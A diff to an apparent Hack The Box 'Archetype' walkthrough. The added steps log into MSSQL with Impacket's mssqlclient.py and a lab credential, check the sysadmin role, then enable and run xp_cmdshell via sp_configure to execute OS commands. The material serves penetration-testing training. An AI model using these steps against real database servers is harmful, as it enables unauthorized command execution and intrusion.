@@ -60,17 +60,30 @@ Using <code>get</code> command to download the <code>prod.dtsConfig</code>.<br>
 The information provided in prog.dtsConfig allows us to connect and successfully authenticate into the <code>MSSQL server</code>.<br>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/password.png" alt="password" width="60%">
 
-There are many python scripts in <a href="https://github.com/fortra/impacket">Impacket</a> for us to use, and what will be used here is <a href="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/mssqlclient.py> mssqlclient.py</a>.
+There are many python scripts in <a href="https://github.com/fortra/impacket">Impacket</a> for us to use, and what will be used here is <a href="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/mssqlclient.py"> mssqlclient.py</a>.
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/mssqlclient.png" alt="mssqlclient" width="60%">
 
-<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/MSSQLauth.png" alt="MSSQLauth" width="60%">
-
+<b>cmd</b>：<code>python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@&lt;target_ip&gt; -windows-auth</code><br>
+<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/MSSQLauth.png" alt="MSSQLauth" width="60%"><br>
+After entering SQL, enter <code>help</code> to see which tools or functions are currently available.<br>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/SQLhelp.png" alt="SQLhelp" width="60%">
-
+Confirm current identity (1=True).<br>
+<b>cmd</b>：<code>SELECT is_srvrolemember('sysadmin');</code><br>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/SQLrole.png" alt="SQLrole" width="60%">
-
+If no settings have been configured, the result of the command is as shown in the pic below.<br>
+<b>cmd</b>：<code>EXEC xp_cmdshell 'net user';</code><br>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/netuser.png" alt="netuser" width="60%">
 
+Indeed is not activated.<br>
+For this reason we will need to proceed with the activation of <code>xp_cmdshell</code> as
+follows:<br>
+<pre class="text">
+EXEC sp_configure 'show advanced options', 1;   #Open advanced settings, 1=True
+RECONFIGURE;    #Reconfigure so that the settings just now have been confirmed
+sp_configure;   #Enabling the sp_configure as stated in the above error message
+EXEC sp_configure 'xp_cmdshell', 1;   #Open xp_cmdshell, 1=True
+RECONFIGURE;
+</pre>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/SQLconfigure.png" alt="SQLconfigure" width="60%">
 
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/SQLcondigure2.png" alt="SQLcondigure2" width="60%">
